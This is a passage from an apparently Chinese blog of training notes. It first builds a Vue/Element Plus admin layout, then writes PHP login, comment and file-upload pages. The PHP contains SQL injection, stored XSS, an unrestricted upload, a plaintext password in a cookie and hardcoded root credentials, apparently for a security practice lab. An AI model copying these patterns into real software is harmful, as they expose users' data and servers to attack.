class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-row class=&quot;tac&quot;&gt;</span><br><span class="line">    &lt;el-col :span=&quot;12&quot;&gt;</span><br><span class="line">      &lt;h5 class=&quot;mb-2&quot;&gt;Default colors&lt;/h5&gt;</span><br><span class="line">      &lt;el-menu</span><br><span class="line">        default-active=&quot;2&quot;</span><br><span class="line">        class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">        @open=&quot;handleOpen&quot;</span><br><span class="line">        @close=&quot;handleClose&quot;</span><br><span class="line">      &gt;</span><br><span class="line">       </span><br><span class="line">        &lt;el-menu-item index=&quot;2&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Two&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;3&quot; disabled&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;document /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Three&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;4&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;setting /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Four&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;/el-menu&gt;</span><br><span class="line">    &lt;/el-col&gt;</span><br><span class="line">    &lt;el-col :span=&quot;12&quot;&gt;</span><br><span class="line">      &lt;h5 class=&quot;mb-2&quot;&gt;Custom colors&lt;/h5&gt;</span><br><span class="line">      &lt;el-menu</span><br><span class="line">        active-text-color=&quot;#ffd04b&quot;</span><br><span class="line">        background-color=&quot;#545c64&quot;</span><br><span class="line">        class=&quot;el-menu-vertical-demo&quot;</span><br><span class="line">        default-active=&quot;2&quot;</span><br><span class="line">        text-color=&quot;#fff&quot;</span><br><span class="line">        @open=&quot;handleOpen&quot;</span><br><span class="line">        @close=&quot;handleClose&quot;</span><br><span class="line">      &gt;</span><br><span class="line">        &lt;el-sub-menu index=&quot;1&quot;&gt;</span><br><span class="line">          &lt;template #title&gt;</span><br><span class="line">            &lt;el-icon&gt;&lt;location /&gt;&lt;/el-icon&gt;</span><br><span class="line">            &lt;span&gt;Navigator One&lt;/span&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;el-menu-item-group title=&quot;Group One&quot;&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-1&quot;&gt;item one&lt;/el-menu-item&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-2&quot;&gt;item two&lt;/el-menu-item&gt;</span><br><span class="line">          &lt;/el-menu-item-group&gt;</span><br><span class="line">          &lt;el-menu-item-group title=&quot;Group Two&quot;&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-3&quot;&gt;item three&lt;/el-menu-item&gt;</span><br><span class="line">          &lt;/el-menu-item-group&gt;</span><br><span class="line">          &lt;el-sub-menu index=&quot;1-4&quot;&gt;</span><br><span class="line">            &lt;template #title&gt;item four&lt;/template&gt;</span><br><span class="line">            &lt;el-menu-item index=&quot;1-4-1&quot;&gt;item one&lt;/el-menu-item&gt;</span><br><span class="line">          &lt;/el-sub-menu&gt;</span><br><span class="line">        &lt;/el-sub-menu&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;2&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;icon-menu /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Two&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;3&quot; disabled&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;document /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Three&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">        &lt;el-menu-item index=&quot;4&quot;&gt;</span><br><span class="line">          &lt;el-icon&gt;&lt;setting /&gt;&lt;/el-icon&gt;</span><br><span class="line">          &lt;span&gt;Navigator Four&lt;/span&gt;</span><br><span class="line">        &lt;/el-menu-item&gt;</span><br><span class="line">      &lt;/el-menu&gt;</span><br><span class="line">    &lt;/el-col&gt;</span><br><span class="line">  &lt;/el-row&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">import &#123;</span><br><span class="line">  Document,</span><br><span class="line">  Menu as IconMenu,</span><br><span class="line">  Location,</span><br><span class="line">  Setting,</span><br><span class="line">&#125; from &#x27;@element-plus/icons-vue&#x27;</span><br><span class="line">const handleOpen = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>6.在app.vue中删除下列代码的string</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const handleOpen = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br><span class="line">const handleClose = (key: string, keyPath: string[]) =&gt; &#123;</span><br><span class="line">  console.log(key, keyPath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>7.把span&#x3D;12改成span&#x3D;24，侧边栏span&#x3D;24表示占满      el-col :span&#x3D;”24”表示竖直方向占满<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702298169039-6bf73205-5c61-4b50-b56b-518fa680bfea.png" alt="image.png"><br>8.在侧边栏导入图标，复制代码在对应的用户管理，权限管理，商品管理，订单管理语句各自的前一行。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478133938-4a3a0f16-2685-47d7-b5fc-2fa4e3f3f26c.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702298662954-37b0eb22-a73f-4b8f-badd-6a21f1a55a4b.png" alt="image.png"></p>
<h2 id="二-在el-header设置阴影，圆角边框"><a href="#二-在el-header设置阴影，圆角边框" class="headerlink" title="二.在el-header设置阴影，圆角边框"></a>二.在el-header设置阴影，圆角边框</h2><p>1.在el-header中创建styled-box1类。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702299037715-c342f095-d463-419a-98bf-1b325dcfdd94.png" alt="image.png"><br> 在style创建styled-box1样式。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702299210651-716ae9ad-d358-4049-82fe-ba1e0fdf90f0.png" alt="image.png"><br>2.CTRL+S保存，在终端输入npm run dev, 结果如下图<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702299408016-718c337f-2f6d-4c53-8f5f-db3ee347fe6f.png" alt="image.png"><br>3.引入搜索框input和搜索，添加用户两个按钮，注意el-row是行，el-col是列。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-row&gt;</span><br><span class="line">          &lt;el-col :span=&quot;4&quot;</span><br><span class="line">            &gt;&lt;el-input v-model=&quot;input&quot; placeholder=&quot;请输入搜索内容&quot;</span><br><span class="line">          /&gt;&lt;/el-col&gt;</span><br><span class="line">          &lt;el-col :span=&quot;2&quot;&gt;&lt;el-button type=&quot;success&quot;&gt;搜索&lt;/el-button&gt;&lt;/el-col&gt;</span><br><span class="line">          &lt;el-col :span=&quot;2&quot;&gt;   &lt;el-button type=&quot;success&quot;&gt;添加用户&lt;/el-button&gt;&lt;/el-col&gt;</span><br><span class="line">        &lt;/el-row&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702300021651-558624ba-d852-43da-aa59-4fad9e072223.png" alt="image.png"></p>
<h2 id="三-引入表格和分页"><a href="#三-引入表格和分页" class="headerlink" title="三.引入表格和分页"></a>三.引入表格和分页</h2><p>1.找到表格，复制代码引入app.vue<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478209116-41c089fd-0661-4edf-a77a-0c4c56681425.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-table :data=&quot;tableData&quot; style=&quot;width: 100%&quot;&gt;</span><br><span class="line">    &lt;el-table-column prop=&quot;date&quot; label=&quot;Date&quot; width=&quot;180&quot; /&gt;</span><br><span class="line">    &lt;el-table-column prop=&quot;name&quot; label=&quot;Name&quot; width=&quot;180&quot; /&gt;</span><br><span class="line">    &lt;el-table-column prop=&quot;address&quot; label=&quot;Address&quot; /&gt;</span><br><span class="line">  &lt;/el-table&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">const tableData = [</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-03&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-02&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-04&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    date: &#x27;2016-05-01&#x27;,</span><br><span class="line">    name: &#x27;Tom&#x27;,</span><br><span class="line">    address: &#x27;No. 189, Grove St, Los Angeles&#x27;,</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>2.找到分页，引入分页<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478241936-99f04e0f-0a46-45ea-8cec-2849c886f97f.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-pagination</span><br><span class="line">    :page-size=&quot;20&quot;</span><br><span class="line">    :pager-count=&quot;11&quot;</span><br><span class="line">    layout=&quot;prev, pager, next&quot;</span><br><span class="line">    :total=&quot;1000&quot;</span><br><span class="line">  /&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>

<p>刷新浏览器页面，最终的页面如下：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478272976-d56c923e-07ad-4c65-a0c9-0ca9a971be3a.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记15" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B015/" class="article-date">
      <time datetime="2023-12-14T06:17:43.000Z" itemprop="datePublished">2023-12-14</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B015/">PHP跳转页面，PHP写评论区和文件上传框</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="一-PHP跳转页面"><a href="#一-PHP跳转页面" class="headerlink" title="一.PHP跳转页面"></a>一.PHP跳转页面</h2><p>1.cookie和session的区别<br>Cookie数据存储在本地，session在服务器下发cookie<br>2.首先，创建并编写index.php  ,  link.php,  zhuye.php三个文件并用vscode打开。先编写index.php文件，用from表单写一个简单的登录页面。代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;?php header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;汗流浃背了&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; action=&quot;link.php&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;用户名&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;密码&amp;nbsp&amp;nbsp&amp;nbsp&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=&quot;checkbox&quot;name=&quot;remeber&quot; value=&quot;yes&quot; &gt;记住密码&lt;/td&gt;&lt;br&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;  value=&quot;提交&quot; &gt;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=&quot;reset&quot;   value=&quot;重置&quot; &gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.再编写link.php，用于连接数据库。用session存储index.php传递过来的用户名和密码<br>然后在数据库中查询是否存在该用户名和密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type: text/html; charset=utf-8&#x27;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $u = trim($_POST[&#x27;username&#x27;]);</span><br><span class="line">    $p = trim($_POST[&#x27;password&#x27;]);</span><br><span class="line"> $link=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;)or exit(&quot;Error connecting&quot;);</span><br><span class="line">      mysqli_query($link,&quot;set names utf8&quot;);</span><br><span class="line">  $sql=  &quot;select * from users where username=&#x27;$u&#x27; and password=&#x27;$p&#x27;&quot;;</span><br><span class="line">  $result=mysqli_query($link, $sql) ;</span><br><span class="line">  if(mysqli_num_rows($result)&gt;=1)&#123;</span><br><span class="line">        $_SESSION[&#x27;user&#x27;]=$u;       </span><br><span class="line">        setcookie(&#x27;password&#x27;,$p,time()+7*12*60*60);</span><br><span class="line">        header(&#x27;Location:zhuye.php&#x27;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &#x27;用户名或密码错误!请重新输入!&#x27;;</span><br><span class="line">		//sleep(3);</span><br><span class="line">		echo &#x27;&lt;h1&gt;&lt;a href=&quot;./index.php&quot;&gt;返回&lt;/a&gt;&lt;/h1&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>4.编写 zhuye.php,传递数据库对应的用户名并显示。然后实现用户注销的功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&#x27;user&#x27;]))&#123;</span><br><span class="line">	echo &#x27;当前登录用户:&#x27;.$_SESSION[&#x27;user&#x27;].&#x27;&#x27;; </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;logout&#x27;])) &#123;</span><br><span class="line">    // 清除会话数据</span><br><span class="line">    session_unset();</span><br><span class="line">    session_destroy();</span><br><span class="line">    echo &quot;您已成功注销。&lt;br&gt;&quot;;</span><br><span class="line">	header(&#x27;Location:index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;h1&gt;&lt;a href=&quot;?logout=true&quot;&gt;注销&lt;/a&gt;&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &#x27;错误!&#x27;;</span><br><span class="line">header(&#x27;Location:index.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702533754028-987090e7-37f6-4657-a464-0840383139fd.png" alt="Image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702533813498-778c26c5-716f-4c69-8646-f9e434d80953.png" alt="Image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702533856093-d60c12af-4786-408b-97a8-49d059b7f072.png" alt="Image.png"></p>
<h2 id="二-PHP写评论区和文件上传框"><a href="#二-PHP写评论区和文件上传框" class="headerlink" title="二.PHP写评论区和文件上传框"></a>二.PHP写评论区和文件上传框</h2><p>1.创建并编写comment.php,先用from表单的textarea写一个评论区。右击虚拟机的navicat.exe的之前创的数据库security，新建数据表security,把用户输入的评论插入到security数据库的数据表comments。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702524986431-b3c47b78-8c75-42d2-b442-546de11d4f37.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .ab &#123;</span><br><span class="line">            color:blue;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">        &lt;label for=&quot;comment&quot;&gt;发表评论&lt;/label&gt;</span><br><span class="line"></span><br><span class="line">        &lt;textarea name=&quot;comment&quot; id=&quot;comment&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交评论&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;h1 class=&quot;ab&quot;&gt;历史评论&lt;/h1&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] == &#x27;POST&#x27;) &#123;</span><br><span class="line">        if (isset($_POST[&#x27;comment&#x27;]) &amp;&amp; !empty($_POST[&#x27;comment&#x27;])) &#123;</span><br><span class="line">            $comment = $_POST[&#x27;comment&#x27;];</span><br><span class="line">            $link = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;数据库连接失败！&quot;);</span><br><span class="line">            mysqli_query($link, &quot;set names utf8&quot;);</span><br><span class="line">            $ChaRu = &quot;insert INTO comments (comment) VALUES(&#x27;$comment&#x27;)&quot;;</span><br><span class="line">            if (mysqli_query($link, $ChaRu)) &#123;</span><br><span class="line">                echo &quot;&lt;p&gt;你的评论已成功保存到数据库。&lt;/p&gt;&quot;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;&lt;p style=&#x27;color: red;&#x27;&gt;保存评论时出错。&lt;/p&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            mysqli_close($link);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 显示最近的20条评论</span><br><span class="line">    $link = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;数据库连接失败！&quot;);</span><br><span class="line">    mysqli_query($link, &quot;set names utf8&quot;);</span><br><span class="line"></span><br><span class="line">    $query = &quot;SELECT * FROM comments ORDER BY id DESC LIMIT 20&quot;;    </span><br><span class="line">    $result = mysqli_query($link, $query);</span><br><span class="line"></span><br><span class="line">    if ($result) &#123;</span><br><span class="line">        echo &quot;&lt;h2&gt;最近的评论&lt;/h2&gt;&quot;;</span><br><span class="line">        while ($row = mysqli_fetch_assoc($result)) &#123;</span><br><span class="line">            echo &quot;&lt;p&gt;&#123;$row[&#x27;comment&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;p style=&#x27;color: red;&#x27;&gt;获取评论时出错。&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($link);</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>2.创建并编写upload.php,再创建upload文件夹，存储用户上传的文件，把index.php， link.php,  zhuye.php，comment.php，upload文件夹复制到phpstudy的根目录下，启动apache和mysql，打开网站，登录，输入评论，上传头像。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#x27;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;label for=&quot;upload&quot;&gt;上传你的头像&lt;/label&gt;</span><br><span class="line">&lt;input name=&quot;file&quot; id=&quot;upload&quot; type=&quot;file&quot; &gt;</span><br><span class="line">&lt;label for=&quot;submit&quot;  &gt;文件上传&lt;/label&gt;</span><br><span class="line">&lt;input name=&quot;submit&quot; id=&quot;submit&quot; type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;h1&gt;下面是接收到的文件&lt;/h1&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">if(isset($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">    $upload_dir = &quot;uploads&quot;;</span><br><span class="line">    $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">    $file_type = $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">    $file_size = $_FILES[&quot;file&quot;][&quot;size&quot;];</span><br><span class="line">    $file_tmp = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $target_path = $upload_dir.&#x27;/&#x27;.$file_name;</span><br><span class="line">    if (move_uploaded_file($file_tmp, $target_path))&#123;</span><br><span class="line">        echo &quot;上传成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;文件类型: &quot; . $file_type . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;文件大小: &quot; . ($file_size / 1024) . &quot; 